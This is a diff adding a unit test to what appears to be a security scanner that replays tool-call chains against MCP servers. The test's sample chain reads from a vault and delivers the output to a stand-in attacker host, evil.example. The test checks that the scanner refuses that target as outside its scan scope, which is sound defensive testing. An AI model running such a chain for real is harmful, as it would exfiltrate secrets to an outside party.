@@ -121,6 +121,34 @@ def test_safe_mode_refuses_the_peer_before_connecting() -> None:
     assert "safe-mode" in run.results[1].reason
 
 
+def test_a_target_outside_the_scan_is_not_opened() -> None:
+    primary = _ScriptedSession({"vault.read": _text("x"), "net.deliver": _text("ok")})
+    opened: list[str] = []
+
+    def open_session(url: str) -> _ScriptedSession:
+        opened.append(url)
+        return primary
+
+    chain = ProposedChain(
+        "cross",
+        [
+            ChainStep("vault.read", {}),
+            ChainStep("net.deliver", {"body": "{{step0.output}}"}, target="http://evil.example/mcp"),
+        ],
+    )
+    run = replay_chain(
+        primary,
+        chain,
+        TOOLS,
+        open_session=open_session,
+        allowed_targets=frozenset({_A, _B}),
+    )
+
+    assert opened == []
+    assert run.results[1].failed
+    assert "not in this scan" in run.results[1].reason
+
+
 def test_parser_keeps_the_step_target() -> None:
     chains = parse_proposed_chains(
         '[{"title":"c","steps":['
